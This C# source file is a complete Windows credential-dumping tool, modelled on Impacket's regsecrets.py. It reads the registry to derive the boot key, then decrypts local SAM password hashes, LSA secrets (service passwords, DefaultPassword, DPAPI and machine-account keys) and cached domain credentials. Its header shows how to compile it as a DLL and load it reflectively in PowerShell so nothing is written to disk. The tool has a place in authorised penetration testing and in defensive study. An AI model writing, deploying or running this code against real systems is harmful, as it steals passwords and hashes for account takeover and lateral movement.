// RegSecrets.cs — Local registry secret extraction (SAM hashes, LSA secrets, cached creds)
// Equivalent to Impacket's regsecrets.py, pure registry queries, no files on disk.
//
// As DLL:
//   csc.exe /target:library /out:RegSecrets.dll RegSecrets.cs
//
// As EXE (also works):
//   csc.exe /out:RegSecrets.exe RegSecrets.cs
//
// Load in PowerShell:
//   [Reflection.Assembly]::LoadFile("$pwd\RegSecrets.dll")
//   [RegSecrets.Dumper]::Execute(@())              # full dump
//   [RegSecrets.Dumper]::Execute(@("--sam-only"))   # SAM only
//
// Load in C#:
//   RegSecrets.Dumper.Execute(new string[] {});
//   RegSecrets.Dumper.Execute(new string[] { "--sam-only" });

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace RegSecrets
{
    public class Dumper
    {
        // ====================================================================
        // P/Invoke — Token Privileges
        // ====================================================================
        [StructLayout(LayoutKind.Sequential)]
        struct LUID { public uint LowPart; public int HighPart; }

        [StructLayout(LayoutKind.Sequential)]
        struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_PRIVILEGES { public uint Count; public LUID_AND_ATTRIBUTES Priv; }

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr proc, uint access, out IntPtr token);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool LookupPrivilegeValue(string sys, string name, out LUID luid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool AdjustTokenPrivileges(IntPtr token, bool disableAll,
            ref TOKEN_PRIVILEGES ns, int bufLen, IntPtr prev, IntPtr retLen);

        // ====================================================================
        // P/Invoke — Registry
        // ====================================================================
        static readonly IntPtr HKLM = new IntPtr(unchecked((int)0x80000002));
        const int BACKUP = 0x00000004;
        const int KEY_READ = 0x20019;

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern int RegOpenKeyEx(IntPtr hKey, string subKey, int options, int sam, out IntPtr result);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern int RegQueryValueEx(IntPtr hKey, string name, IntPtr reserved,
            out uint type, byte[] data, ref uint len);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern int RegQueryInfoKey(IntPtr hKey, StringBuilder cls, ref uint clsLen,
            IntPtr reserved, out uint subKeys, out uint maxSub, out uint maxCls,
            out uint values, out uint maxValName, out uint maxValLen,
            IntPtr secDesc, IntPtr lastWrite);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern int RegEnumKeyEx(IntPtr hKey, uint index, StringBuilder name,
            ref uint nameLen, IntPtr reserved, StringBuilder cls, ref uint clsLen, IntPtr lastWrite);

        [DllImport("advapi32.dll")]
        static extern int RegCloseKey(IntPtr hKey);

        // ====================================================================
        // P/Invoke — BCrypt (DES without weak-key restrictions, and MD4)
        // ====================================================================
        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        static extern int BCryptOpenAlgorithmProvider(out IntPtr hAlg, string algId, string impl, uint flags);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        static extern int BCryptSetProperty(IntPtr hObj, string prop, byte[] input, int cbInput, int flags);

        [DllImport("bcrypt.dll")]
        static extern int BCryptGenerateSymmetricKey(IntPtr hAlg, out IntPtr hKey,
            IntPtr obj, int objLen, byte[] secret, int cbSecret, int flags);

        [DllImport("bcrypt.dll")]
        static extern int BCryptDecrypt(IntPtr hKey, byte[] input, int cbInput,
            IntPtr paddingInfo, byte[] iv, int cbIV, byte[] output, int cbOutput,
            out int cbResult, int flags);

        [DllImport("bcrypt.dll")]
        static extern int BCryptDestroyKey(IntPtr hKey);

        [DllImport("bcrypt.dll")]
        static extern int BCryptCloseAlgorithmProvider(IntPtr hAlg, int flags);

        [DllImport("bcrypt.dll")]
        static extern int BCryptCreateHash(IntPtr hAlg, out IntPtr hHash,
            IntPtr obj, int objLen, IntPtr secret, int secretLen, int flags);

        [DllImport("bcrypt.dll")]
        static extern int BCryptHashData(IntPtr hHash, byte[] input, int cbInput, int flags);

        [DllImport("bcrypt.dll")]
        static extern int BCryptFinishHash(IntPtr hHash, byte[] output, int cbOutput, int flags);

        [DllImport("bcrypt.dll")]
        static extern int BCryptDestroyHash(IntPtr hHash);

        // ====================================================================
        // Helpers — Privileges
        // ====================================================================
        static void EnablePrivilege(string privilege)
        {
            IntPtr token;
            if (!OpenProcessToken((IntPtr)(-1), 0x0028, out token))
                throw new Win32Exception(Marshal.GetLastWin32Error());
            var tp = new TOKEN_PRIVILEGES { Count = 1 };
            tp.Priv.Attributes = 0x00000002;
            if (!LookupPrivilegeValue(null, privilege, out tp.Priv.Luid))
                throw new Win32Exception(Marshal.GetLastWin32Error());
            if (!AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
                throw new Win32Exception(Marshal.GetLastWin32Error());
            if (Marshal.GetLastWin32Error() == 1300)
                throw new Win32Exception(1300, "Token does not hold: " + privilege);
        }

        // ====================================================================
        // Helpers — Registry
        // ====================================================================
        static IntPtr OpenKey(string path, bool backupIntent = false)
        {
            IntPtr hKey;
            int ret = RegOpenKeyEx(HKLM, path, backupIntent ? BACKUP : 0, KEY_READ, out hKey);
            if (ret != 0) throw new Exception("RegOpenKeyEx '" + path + "' error " + ret);
            return hKey;
        }

        static byte[] ReadValue(IntPtr hKey, string name)
        {
            uint type = 0, len = 0;
            int ret = RegQueryValueEx(hKey, name, IntPtr.Zero, out type, null, ref len);
            if (ret != 0) throw new Exception("RegQueryValueEx '" + name + "' size error " + ret);
            byte[] data = new byte[len];
            ret = RegQueryValueEx(hKey, name, IntPtr.Zero, out type, data, ref len);
            if (ret != 0) throw new Exception("RegQueryValueEx '" + name + "' read error " + ret);
            return data;
        }

        static byte[] ReadDefaultValue(IntPtr hKey)
        {
            uint type = 0, len = 0;
            int ret = RegQueryValueEx(hKey, null, IntPtr.Zero, out type, null, ref len);
            if (ret != 0) throw new Exception("RegQueryValueEx (Default) size error " + ret);
            byte[] data = new byte[len];
            ret = RegQueryValueEx(hKey, null, IntPtr.Zero, out type, data, ref len);
            if (ret != 0) throw new Exception("RegQueryValueEx (Default) read error " + ret);
            return data;
        }

        static string ReadClassName(IntPtr hKey)
        {
            uint clsLen = 256;
            var cls = new StringBuilder(256);
            uint a, b, c, d, e, f;
            RegQueryInfoKey(hKey, cls, ref clsLen, IntPtr.Zero,
                out a, out b, out c, out d, out e, out f, IntPtr.Zero, IntPtr.Zero);
            return cls.ToString();
        }

        static List<string> EnumSubkeys(IntPtr hKey)
        {
            var result = new List<string>();
            uint index = 0;
            while (true)
            {
                uint nameLen = 256, clsLen = 0;
                var name = new StringBuilder(256);
                int ret = RegEnumKeyEx(hKey, index, name, ref nameLen,
                    IntPtr.Zero, null, ref clsLen, IntPtr.Zero);
                if (ret != 0) break;
                result.Add(name.ToString());
                index++;
            }
            return result;
        }

        // ====================================================================
        // Helpers — Byte manipulation
        // ====================================================================
        static byte[] Slice(byte[] src, int offset, int count)
        {
            if (offset + count > src.Length) count = src.Length - offset;
            if (count <= 0) return new byte[0];
            byte[] r = new byte[count];
            Buffer.BlockCopy(src, offset, r, 0, count);
            return r;
        }

        static string ToHex(byte[] b)
        {
            var sb = new StringBuilder(b.Length * 2);
            foreach (byte x in b) sb.Append(x.ToString("x2"));
            return sb.ToString();
        }

        // ====================================================================
        // Crypto — AES
        // ====================================================================
        static byte[] AesCbcDecrypt(byte[] key, byte[] iv, byte[] data)
        {
            if (data.Length == 0) return new byte[0];
            if (data.Length % 16 != 0)
            {
                byte[] padded = new byte[((data.Length / 16) + 1) * 16];
                Buffer.BlockCopy(data, 0, padded, 0, data.Length);
                data = padded;
            }
            using (var aes = Aes.Create())
            {
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.None;
                aes.KeySize = key.Length * 8;
                aes.Key = key;
                aes.IV = iv;
                using (var dec = aes.CreateDecryptor())
                    return dec.TransformFinalBlock(data, 0, data.Length);
            }
        }

        static byte[] AesEcbDecrypt(byte[] key, byte[] data)
        {
            if (data.Length == 0) return new byte[0];
            if (data.Length % 16 != 0)
            {
                byte[] padded = new byte[((data.Length / 16) + 1) * 16];
                Buffer.BlockCopy(data, 0, padded, 0, data.Length);
                data = padded;
            }
            using (var aes = Aes.Create())
            {
                aes.Mode = CipherMode.ECB;
                aes.Padding = PaddingMode.None;
                aes.KeySize = key.Length * 8;
                aes.Key = key;
                using (var dec = aes.CreateDecryptor())
                    return dec.TransformFinalBlock(data, 0, data.Length);
            }
        }

        // ====================================================================
        // Crypto — RC4
        // ====================================================================
        static byte[] RC4(byte[] key, byte[] data)
        {
            byte[] s = new byte[256];
            for (int i = 0; i < 256; i++) s[i] = (byte)i;
            int j = 0;
            for (int i = 0; i < 256; i++)
            {
                j = (j + s[i] + key[i % key.Length]) & 0xFF;
                byte t = s[i]; s[i] = s[j]; s[j] = t;
            }
            byte[] o = new byte[data.Length];
            int a = 0, b = 0;
            for (int n = 0; n < data.Length; n++)
            {
                a = (a + 1) & 0xFF;
                b = (b + s[a]) & 0xFF;
                byte t = s[a]; s[a] = s[b]; s[b] = t;
                o[n] = (byte)(data[n] ^ s[(s[a] + s[b]) & 0xFF]);
            }
            return o;
        }

        // ====================================================================
        // Crypto — DES via BCrypt (no weak-key restrictions)
        // ====================================================================
        static byte[] DesEcbDecrypt(byte[] key8, byte[] data8)
        {
            IntPtr hAlg, hKey;
            BCryptOpenAlgorithmProvider(out hAlg, "DES", null, 0);
            byte[] ecb = Encoding.Unicode.GetBytes("ChainingModeECB\0");
            BCryptSetProperty(hAlg, "ChainingMode", ecb, ecb.Length, 0);
            BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key8, key8.Length, 0);
            byte[] output = new byte[8];
            int cbResult;
            BCryptDecrypt(hKey, data8, data8.Length, IntPtr.Zero, null, 0,
                output, output.Length, out cbResult, 0);
            BCryptDestroyKey(hKey);
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return output;
        }

        static byte[] ExpandDesKey(byte[] k7)
        {
            return new byte[] {
                (byte)(((k7[0] >> 1) & 0x7F) << 1),
                (byte)((((k7[0] & 0x01) << 6) | (k7[1] >> 2)) << 1),
                (byte)((((k7[1] & 0x03) << 5) | (k7[2] >> 3)) << 1),
                (byte)((((k7[2] & 0x07) << 4) | (k7[3] >> 4)) << 1),
                (byte)((((k7[3] & 0x0F) << 3) | (k7[4] >> 5)) << 1),
                (byte)((((k7[4] & 0x1F) << 2) | (k7[5] >> 6)) << 1),
                (byte)((((k7[5] & 0x3F) << 1) | (k7[6] >> 7)) << 1),
                (byte)(((k7[6] & 0x7F)) << 1)
            };
        }

        static byte[] RidDesDecrypt(int rid, byte[] enc16)
        {
            byte[] rb = BitConverter.GetBytes((uint)rid);
            byte[] k1 = ExpandDesKey(new byte[] { rb[0], rb[1], rb[2], rb[3], rb[0], rb[1], rb[2] });
            byte[] k2 = ExpandDesKey(new byte[] { rb[3], rb[0], rb[1], rb[2], rb[3], rb[0], rb[1] });
            byte[] h1 = DesEcbDecrypt(k1, Slice(enc16, 0, 8));
            byte[] h2 = DesEcbDecrypt(k2, Slice(enc16, 8, 8));
            byte[] result = new byte[16];
            Buffer.BlockCopy(h1, 0, result, 0, 8);
            Buffer.BlockCopy(h2, 0, result, 8, 8);
            return result;
        }

        // ====================================================================
        // Crypto — SHA256 key derivation: SHA256(key || salt * 1000)
        // ====================================================================
        static byte[] Sha256Derive(byte[] key, byte[] salt, int rounds = 1000)
        {
            byte[] input = new byte[key.Length + salt.Length * rounds];
            Buffer.BlockCopy(key, 0, input, 0, key.Length);
            int pos = key.Length;
            for (int i = 0; i < rounds; i++)
            {
                Buffer.BlockCopy(salt, 0, input, pos, salt.Length);
                pos += salt.Length;
            }
            using (var sha = SHA256.Create())
                return sha.ComputeHash(input);
        }

        // ====================================================================
        // Crypto — MD4 via BCrypt (for $MACHINE.ACC NT hash)
        // ====================================================================
        static byte[] MD4(byte[] data)
        {
            IntPtr hAlg, hHash;
            BCryptOpenAlgorithmProvider(out hAlg, "MD4", null, 0);
            BCryptCreateHash(hAlg, out hHash, IntPtr.Zero, 0, IntPtr.Zero, 0, 0);
            BCryptHashData(hHash, data, data.Length, 0);
            byte[] hash = new byte[16];
            BCryptFinishHash(hHash, hash, 16, 0);
            BCryptDestroyHash(hHash);
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return hash;
        }

        // ====================================================================
        // LSA blob decryption (Vista+ AES-256-ECB)
        // ====================================================================
        static byte[] DecryptLsaBlob(byte[] key, byte[] raw)
        {
            // LSA_SECRET: Version(4) + EncKeyID(16) + EncAlgorithm(4) + Flags(4) = 28
            // EncryptedData = raw[28:], Salt = first 32 bytes, Ciphertext = rest
            // Impacket uses AES-ECB (zero IV reset per block)
            if (raw.Length < 60)
                throw new Exception("LSA_SECRET too short (" + raw.Length + " bytes)");

            byte[] salt = Slice(raw, 28, 32);
            byte[] cipher = Slice(raw, 60, raw.Length - 60);

            if (cipher.Length % 16 != 0)
            {
                byte[] padded = new byte[((cipher.Length / 16) + 1) * 16];
                Buffer.BlockCopy(cipher, 0, padded, 0, cipher.Length);
                cipher = padded;
            }

            byte[] aesKey = Sha256Derive(key, salt);
            return AesEcbDecrypt(aesKey, cipher);
        }

        // ====================================================================
        // Boot Key
        // ====================================================================
        static byte[] GetBootKey()
        {
            string scrambled = "";
            foreach (string name in new[] { "JD", "Skew1", "GBG", "Data" })
            {
                IntPtr hk = OpenKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\" + name);
                scrambled += ReadClassName(hk);
                RegCloseKey(hk);
            }
            if (scrambled.Length != 32)
                throw new Exception("Boot key hex length " + scrambled.Length + ", expected 32");

            byte[] scrambledBytes = new byte[16];
            for (int i = 0; i < 16; i++)
                scrambledBytes[i] = Convert.ToByte(scrambled.Substring(i * 2, 2), 16);

            int[] perm = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };
            byte[] bootKey = new byte[16];
            for (int i = 0; i < 16; i++) bootKey[i] = scrambledBytes[perm[i]];
            return bootKey;
        }

        // ====================================================================
        // SAM Hashes
        // ====================================================================
        static readonly byte[] NTPASSWORD = { 0x4E,0x54,0x50,0x41,0x53,0x53,0x57,0x4F,0x52,0x44,0x00 };
        static readonly byte[] LMPASSWORD = { 0x4C,0x4D,0x50,0x41,0x53,0x53,0x57,0x4F,0x52,0x44,0x00 };
        static readonly string EMPTY_LM = "aad3b435b51404eeaad3b435b51404ee";
        static readonly string EMPTY_NT = "31d6cfe0d16ae931b73c59d7e0c089c0";

        static readonly byte[] QWERTY = {
            0x21,0x40,0x23,0x24,0x25,0x5E,0x26,0x2A,0x28,0x29,
            0x71,0x77,0x65,0x72,0x74,0x79,0x55,0x49,0x4F,0x50,0x41,0x7A,0x78,
            0x63,0x76,0x62,0x6E,0x6D,0x51,0x51,0x51,0x51,0x51,0x51,0x51,0x51,
            0x51,0x51,0x51,0x51,0x29,0x28,0x2A,0x40,0x26,0x25,0x00
        };
        static readonly byte[] DIGITS = {
            0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,
            0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,
            0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,
            0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x00
        };

        static string DecryptSamHash(byte[] vValue, int entryOff, int rid,
            byte[] samKey, byte[] constant, string emptyHash)
        {
            int off = BitConverter.ToInt32(vValue, entryOff) + 0xCC;
            int len = BitConverter.ToInt32(vValue, entryOff + 4);
            if (len < 4) return emptyHash;

            ushort hashRev = BitConverter.ToUInt16(vValue, off + 2);
            uint dataOffset = BitConverter.ToUInt32(vValue, off + 4);

            if (hashRev == 2) // AES
            {
                if (dataOffset == 0 || len < 40) return emptyHash;
                byte[] hSalt = Slice(vValue, off + 8, 16);
                byte[] hEnc = Slice(vValue, off + 24, 16);
                byte[] hDec = AesCbcDecrypt(samKey, hSalt, hEnc);
                return ToHex(RidDesDecrypt(rid, Slice(hDec, 0, 16)));
            }
            else if (hashRev == 1) // RC4
            {
                if (len < 20) return emptyHash;
                byte[] hEnc = Slice(vValue, off + 4, 16);
                byte[] md5In = new byte[16 + 4 + constant.Length];
                Buffer.BlockCopy(samKey, 0, md5In, 0, 16);
                Buffer.BlockCopy(BitConverter.GetBytes((uint)rid), 0, md5In, 16, 4);
                Buffer.BlockCopy(constant, 0, md5In, 20, constant.Length);
                byte[] rc4Key;
                using (var md5 = MD5.Create()) rc4Key = md5.ComputeHash(md5In);
                byte[] hDec = RC4(rc4Key, hEnc);
                return ToHex(RidDesDecrypt(rid, hDec));
            }
            return emptyHash;
        }

        static int DumpSam(byte[] bootKey)
        {
            Console.WriteLine("\n=== Deriving SAM key ===");
            IntPtr hAccount = OpenKey("SAM\\SAM\\Domains\\Account", true);
            byte[] fValue = ReadValue(hAccount, "F");
            RegCloseKey(hAccount);

            int rev = BitConverter.ToInt32(fValue, 0x68);
            byte[] samKey;

            if (rev == 2) // AES
            {
                int dataLen = BitConverter.ToInt32(fValue, 0x74);
                byte[] salt = Slice(fValue, 0x78, 16);
                byte[] enc = Slice(fValue, 0x88, dataLen);
                byte[] dec = AesCbcDecrypt(bootKey, salt, enc);
                samKey = Slice(dec, 0, 16);
                Console.WriteLine("[+] SAM key (AES): " + ToHex(samKey));
            }
            else if (rev == 1) // RC4
            {
                byte[] salt = Slice(fValue, 0x70, 16);
                byte[] encKey = Slice(fValue, 0x80, 32);
                byte[] md5In = new byte[salt.Length + QWERTY.Length + bootKey.Length + DIGITS.Length];
                int p = 0;
                Buffer.BlockCopy(salt, 0, md5In, p, salt.Length); p += salt.Length;
                Buffer.BlockCopy(QWERTY, 0, md5In, p, QWERTY.Length); p += QWERTY.Length;
                Buffer.BlockCopy(bootKey, 0, md5In, p, bootKey.Length); p += bootKey.Length;
                Buffer.BlockCopy(DIGITS, 0, md5In, p, DIGITS.Length);
                byte[] rc4Key;
                using (var md5 = MD5.Create()) rc4Key = md5.ComputeHash(md5In);
                byte[] decKey = RC4(rc4Key, encKey);
                samKey = Slice(decKey, 0, 16);

                // Checksum
                byte[] chkIn = new byte[16 + DIGITS.Length + 16 + QWERTY.Length];
                p = 0;
                Buffer.BlockCopy(samKey, 0, chkIn, p, 16); p += 16;
                Buffer.BlockCopy(DIGITS, 0, chkIn, p, DIGITS.Length); p += DIGITS.Length;
                Buffer.BlockCopy(samKey, 0, chkIn, p, 16); p += 16;
                Buffer.BlockCopy(QWERTY, 0, chkIn, p, QWERTY.Length);
                byte[] chkExpected;
                using (var md5 = MD5.Create()) chkExpected = md5.ComputeHash(chkIn);
                if (ToHex(chkExpected) != ToHex(Slice(decKey, 16, 16)))
                {
                    Console.WriteLine("[!] SAM key checksum FAILED.");
                    return 0;
                }
                Console.WriteLine("[+] SAM key (RC4): " + ToHex(samKey));
            }
            else
            {
                Console.WriteLine("[!] Unknown SAM_KEY_DATA revision: " + rev);
                return 0;
            }

            // Enumerate users
            Console.WriteLine("\n=== Dumping SAM hashes ===");
            IntPtr hUsers = OpenKey("SAM\\SAM\\Domains\\Account\\Users", true);
            int count = 0;

            foreach (string ridHex in EnumSubkeys(hUsers))
            {
                if (ridHex == "Names") continue;
                int rid = Convert.ToInt32(ridHex, 16);
                try
                {
                    IntPtr hRid = OpenKey("SAM\\SAM\\Domains\\Account\\Users\\" + ridHex, true);
                    byte[] vValue = ReadValue(hRid, "V");
                    RegCloseKey(hRid);

                    int nameOff = BitConverter.ToInt32(vValue, 0x0C) + 0xCC;
                    int nameLen = BitConverter.ToInt32(vValue, 0x10);
                    string userName = "";
                    if (nameLen > 0 && nameOff + nameLen <= vValue.Length)
                        userName = Encoding.Unicode.GetString(vValue, nameOff, nameLen);

                    string lmHash = DecryptSamHash(vValue, 0x9C, rid, samKey, LMPASSWORD, EMPTY_LM);
                    string ntHash = DecryptSamHash(vValue, 0xA8, rid, samKey, NTPASSWORD, EMPTY_NT);
                    Console.WriteLine(userName + ":" + rid + ":" + lmHash + ":" + ntHash + ":::");
                    count++;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] RID " + ridHex + ": " + ex.Message);
                }
            }
            RegCloseKey(hUsers);
            Console.WriteLine("[+] " + count + " SAM accounts extracted");
            return count;
        }

        // ====================================================================
        // LSA Secrets
        // ====================================================================
        static void DumpLsa(byte[] bootKey)
        {
            Console.WriteLine("\n=== Extracting LSA key ===");
            byte[] lsaKey = null;
            try
            {
                IntPtr hPol = OpenKey("SECURITY\\Policy\\PolEKList", true);
                byte[] polRaw = ReadDefaultValue(hPol);
                RegCloseKey(hPol);

                byte[] polDec = DecryptLsaBlob(bootKey, polRaw);
                Console.WriteLine("[+] PolEKList decrypted: " + polDec.Length + " bytes");

                // LSA_SECRET_BLOB: Length(4) + Unknown(12) + Secret
                // Impacket: Secret[52:][:32] = plainText[68:100]
                lsaKey = Slice(polDec, 68, 32);
                Console.WriteLine("[+] LSA key: " + ToHex(lsaKey));
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to extract LSA key: " + ex.Message);
                return;
            }

            Console.WriteLine("\n=== Dumping LSA Secrets ===");
            byte[] nlkmKey = null;

            try
            {
                IntPtr hSecrets = OpenKey("SECURITY\\Policy\\Secrets", true);
                var secretNames = EnumSubkeys(hSecrets);
                RegCloseKey(hSecrets);

                foreach (string secretName in secretNames)
                {
                    try
                    {
                        IntPtr hCV = OpenKey("SECURITY\\Policy\\Secrets\\" + secretName + "\\CurrVal", true);
                        byte[] cvRaw = ReadDefaultValue(hCV);
                        RegCloseKey(hCV);

                        byte[] dec = DecryptLsaBlob(lsaKey, cvRaw);
                        uint secretLen = BitConverter.ToUInt32(dec, 0);
                        if (secretLen > (uint)(dec.Length - 16)) secretLen = (uint)(dec.Length - 16);

                        byte[] secretValue = secretLen > 0 ? Slice(dec, 16, (int)secretLen) : null;

                        Console.WriteLine("[*] " + secretName);

                        if (secretName == "NL$KM")
                        {
                            if (secretValue != null && secretValue.Length > 0)
                            {
                                nlkmKey = secretValue;
                                Console.WriteLine("    " + ToHex(secretValue));
                            }
                            else Console.WriteLine("    (empty)");
                        }
                        else if (secretName == "DPAPI_SYSTEM")
                        {
                            if (secretValue != null && secretValue.Length >= 44)
                            {
                                Console.WriteLine("    dpapi_machinekey: 0x" + ToHex(Slice(secretValue, 4, 20)));
                                Console.WriteLine("    dpapi_userkey:    0x" + ToHex(Slice(secretValue, 24, 20)));
                            }
                            else Console.WriteLine("    " + (secretValue != null ? ToHex(secretValue) : "(empty)"));
                        }
                        else if (secretName == "$MACHINE.ACC")
                        {
                            if (secretValue != null && secretValue.Length > 0)
                            {
                                byte[] ntHash = MD4(secretValue);
                                Console.WriteLine("    " + EMPTY_LM + ":" + ToHex(ntHash));
                            }
                            else Console.WriteLine("    (empty)");
                        }
                        else if (secretName.StartsWith("_SC_"))
                        {
                            if (secretValue != null && secretValue.Length >= 2)
                            {
                                string pw = Encoding.Unicode.GetString(secretValue).TrimEnd('\0');
                                Console.WriteLine("    " + pw);
                            }
                            else Console.WriteLine("    (empty)");
                        }
                        else if (secretName == "DefaultPassword")
                        {
                            if (secretValue != null && secretValue.Length >= 2)
                            {
                                string pw = Encoding.Unicode.GetString(secretValue).TrimEnd('\0');
                                Console.WriteLine("    " + pw);
                            }
                            else Console.WriteLine("    (empty)");
                        }
                        else
                        {
                            if (secretValue == null || secretValue.Length == 0)
                            {
                                Console.WriteLine("    (empty)");
                            }
                            else
                            {
                                bool printable = true;
                                string text = "";
                                if (secretValue.Length >= 2 && secretValue.Length % 2 == 0)
                                {
                                    text = Encoding.Unicode.GetString(secretValue).TrimEnd('\0');
                                    foreach (char c in text)
                                        if (char.IsControl(c) && c != '\0') { printable = false; break; }
                                }
                                else printable = false;

                                Console.WriteLine("    " + (printable && text.Length > 0 ? text : ToHex(secretValue)));
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!] Secret '" + secretName + "': " + ex.Message);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to enumerate secrets: " + ex.Message);
            }

            // ================================================================
            // Cached Domain Credentials (DCC2)
            // ================================================================
            Console.WriteLine("\n=== Dumping cached domain credentials ===");
            if (nlkmKey == null)
            {
                Console.WriteLine("[*] No NL$KM key found - skipping cached credentials");
                return;
            }

            try
            {
                uint iterCount = 10240;
                try
                {
                    IntPtr hc = OpenKey("SECURITY\\Cache", true);
                    byte[] iterRaw = ReadValue(hc, "NL$IterationCount");
                    RegCloseKey(hc);
                    iterCount = BitConverter.ToUInt32(iterRaw, 0);
                    if (iterCount > 10240) iterCount &= 0xFFFF;
                    if (iterCount == 0) iterCount = 10240;
                }
                catch { }

                IntPtr hCache = OpenKey("SECURITY\\Cache", true);
                int cacheCount = 0;

                for (int i = 1; i <= 64; i++)
                {
                    try
                    {
                        byte[] entry = ReadValue(hCache, "NL$" + i);
                        if (entry.Length <= 96) continue;

                        ushort userLen = BitConverter.ToUInt16(entry, 0x00);
                        ushort domainLen = BitConverter.ToUInt16(entry, 0x02);
                        ushort dnsLen = BitConverter.ToUInt16(entry, 0x3C);
                        if (userLen == 0) continue;

                        byte[] iv = Slice(entry, 0x40, 16);
                        byte[] encData = Slice(entry, 0x60, entry.Length - 0x60);
                        // NL$KM AES key = first 16 bytes of the secret value
                    // (Impacket uses NKLMKey[16:32] on the FULL plaintext,
                    //  but we already stripped the 16-byte LSA_SECRET_BLOB header)
                    byte[] nlAesKey = Slice(nlkmKey, 0, 16);
                        byte[] plain = AesCbcDecrypt(nlAesKey, iv, encData);

                        byte[] cachedHash = Slice(plain, 0, 16);

                        string user = "";
                        if (plain.Length >= 0x48 + userLen)
                            user = Encoding.Unicode.GetString(plain, 0x48, userLen);

                        int domOff = 0x48 + userLen;
                        domOff += (4 - (domOff % 4)) % 4;
                        string domain = "";
                        if (domainLen > 0 && domOff + domainLen <= plain.Length)
                            domain = Encoding.Unicode.GetString(plain, domOff, domainLen);

                        int dnsOff = domOff + domainLen;
                        dnsOff += (4 - (dnsOff % 4)) % 4;
                        string dns = "";
                        if (dnsLen > 0 && dnsOff + dnsLen <= plain.Length)
                            dns = Encoding.Unicode.GetString(plain, dnsOff, dnsLen);

                        string dom = dns.Length > 0 ? dns : domain;
                        Console.WriteLine(dom + "/" + user + ":$DCC2$" + iterCount +
                            "#" + user.ToLower() + "#" + ToHex(cachedHash));
                        cacheCount++;
                    }
                    catch { }
                }
                RegCloseKey(hCache);

                if (cacheCount == 0)
                    Console.WriteLine("[*] No cached credentials found");
                else
                    Console.WriteLine("[+] " + cacheCount + " cached credential(s) extracted");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to read cached credentials: " + ex.Message);
            }
        }

        // ====================================================================
        // Main
        // ====================================================================
        public static void Execute(string[] args)
        {
            bool samOnly = Array.Exists(args, delegate(string a) {
                return a.Equals("--sam-only", StringComparison.OrdinalIgnoreCase) ||
                       a.Equals("/samonly", StringComparison.OrdinalIgnoreCase) ||
                       a.Equals("-samonly", StringComparison.OrdinalIgnoreCase);
            });

            Console.WriteLine("\n=== Enabling privileges ===");
            try
            {
                EnablePrivilege("SeBackupPrivilege");
                Console.WriteLine("[+] SeBackupPrivilege enabled");
                EnablePrivilege("SeRestorePrivilege");
                Console.WriteLine("[+] SeRestorePrivilege enabled");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Privilege error: " + ex.Message);
                Console.WriteLine("    Run as Administrator.");
                return;
            }

            Console.WriteLine("\n=== Extracting boot key ===");
            byte[] bootKey;
            try
            {
                bootKey = GetBootKey();
                Console.WriteLine("[+] Boot key: " + ToHex(bootKey));
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Boot key extraction failed: " + ex.Message);
                return;
            }

            DumpSam(bootKey);

            if (!samOnly)
                DumpLsa(bootKey);

            Console.WriteLine("\n=== Done ===");
        }

        // Entry point when compiled as EXE
        static void Main(string[] args) { Execute(args); }
    }
}
